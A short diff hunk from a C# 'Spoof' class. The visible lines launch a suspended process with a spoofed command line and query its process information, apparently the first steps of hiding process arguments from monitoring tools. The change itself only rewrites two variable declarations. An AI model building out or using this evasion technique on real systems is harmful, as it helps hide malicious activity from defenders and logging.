@@ -103,15 +103,17 @@ public static class Spoof
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
 
+        PROCESS_INFORMATION pi;
         if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
-            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out PROCESS_INFORMATION pi))
+            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
             return;
         }
 
         int retLen;
+        PROCESS_BASIC_INFORMATION pbi;
         if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
-            out PROCESS_BASIC_INFORMATION pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
+            out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
             out retLen) != 0)
         {
             ResumeThread(pi.hThread);
